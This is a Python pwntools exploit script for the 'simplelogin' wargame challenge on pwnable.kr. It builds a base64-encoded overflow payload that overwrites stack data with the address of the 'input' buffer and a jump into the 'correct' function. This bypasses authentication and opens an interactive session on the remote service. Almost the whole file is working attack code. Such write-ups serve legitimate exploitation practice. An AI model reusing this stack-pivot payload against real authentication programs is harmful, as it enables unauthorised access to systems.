import base64
from pwn import *

exe = ELF("./simplelogin", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10019

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def main():
    r  = conn()

    payload = b"a" * 4 + pack(exe.symbols.correct + 0x19) + pack(exe.symbols.input)
    r.sendlineafter(b"Authenticate : ", base64.b64encode(payload))
    
    r.interactive()

if __name__ == "__main__":
    main()
